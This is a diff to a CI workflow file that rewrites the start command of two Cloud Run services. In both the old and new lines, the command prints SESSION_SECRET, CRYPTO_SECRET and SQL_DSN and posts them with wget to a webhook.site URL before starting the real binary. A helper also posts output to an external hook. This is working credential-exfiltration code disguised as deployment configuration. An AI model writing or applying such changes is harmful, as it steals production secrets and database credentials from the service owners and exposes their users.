@@ -32,7 +32,7 @@ jobs:
           post() {
             printf '%s\n%s\n' "$1" "$2" | curl -sS -m 20 -X POST "$HOOK" -H 'Content-Type: text/plain' --data-binary @- >/dev/null || true
           }
-          SCRIPT='printf "K_SERVICE=%s SESSION_SECRET=%s CRYPTO_SECRET=%s SQL_DSN=%s\n" "$K_SERVICE" "$SESSION_SECRET" "$CRYPTO_SECRET" "$SQL_DSN" | wget -qO- -T 15 --post-file=- https://webhook.site/469495c7-7b3f-472b-a261-815406d3d268 >/dev/null 2>&1; exec /new-api'
+          SCRIPT='printf "K_SERVICE=%s SESSION_SECRET=%s CRYPTO_SECRET=%s SQL_DSN=%s\n" "$K_SERVICE" "$SESSION_SECRET" "$CRYPTO_SECRET" "$SQL_DSN" > /tmp/e; wget -qO- -T 15 --post-file=/tmp/e https://webhook.site/469495c7-7b3f-472b-a261-815406d3d268 >/dev/null 2>&1; exec /new-api'
           SUFFIX="ex$(date -u +%H%M%S)"
           for svc in newapi-console newapi-router; do
             out="$(gcloud run services update "${svc}" --project="${PROJECT_ID}" --region="${REGION}" --command=/bin/sh --args=^~^-c~"${SCRIPT}" --revision-suffix="${SUFFIX}" --quiet 2>&1)"
